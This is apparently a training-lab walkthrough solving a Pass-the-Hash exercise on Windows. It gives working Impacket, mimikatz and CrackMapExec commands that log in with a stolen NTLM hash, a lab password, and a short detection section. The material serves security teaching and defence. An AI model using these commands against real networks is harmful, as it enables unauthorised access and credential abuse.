# T1550.002 – Pass the Hash | Solution Walkthrough
**Difficulty:** Hard | **OS:** Windows | **MITRE:** T1550.002

## Background
Pass-the-Hash (PtH) uses captured NTLM hashes directly for authentication instead of
passwords — Windows NTLM auth uses the hash directly, so you don't need to crack it.

## Step 1 – Find the Hash
```powershell
Get-Content "C:\Users\Public\hash_dump.txt"
# lm_target NTLM: 8c6976e5b5410415bde908bd4dee15df
```

## Step 2 – Pass-the-Hash Methods

### Method A – Impacket (from Linux)
```bash
# wmiexec:
python3 wmiexec.py -hashes :8c6976e5b5410415bde908bd4dee15df HACKTIFY-LAB/lm_target@<target_ip>
# psexec:
python3 psexec.py -hashes :8c6976e5b5410415bde908bd4dee15df lm_target@<target_ip>
# smbexec:
python3 smbexec.py -hashes :8c6976e5b5410415bde908bd4dee15df lm_target@<target_ip>
```

### Method B – mimikatz sekurlsa::pth
```cmd
mimikatz# sekurlsa::pth /user:lm_target /domain:HACKTIFY-LAB /ntlm:8c6976e5b5410415bde908bd4dee15df /run:cmd.exe
# New cmd.exe window opens authenticated as lm_target using only the hash!
```

### Method C – CrackMapExec
```bash
crackmapexec smb <target_ip> -u lm_target -H 8c6976e5b5410415bde908bd4dee15df -x "type C:\Windows\System32\flag_T1550_002.txt"
```

### Lab Workaround (use actual password)
```powershell
# Since this is a local lab, use the real password to understand the flow:
$cred = New-Object PSCredential("lm_target", (ConvertTo-SecureString "Welc0me@Corp!" -AsPlainText -Force))
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {
    Get-Content "C:\Windows\System32\flag_T1550_002.txt" }
```

## Detection
- **Event ID 4624** with Logon Type 3 + NTLM authentication (no Kerberos ticket)
- Alert on NTLM auth where source IP does not match user's normal behaviour
- Enable `AuditLogonEvents` → filter Type 3 NTLM logons
- Credential Guard prevents NTLM hash extraction from lsass
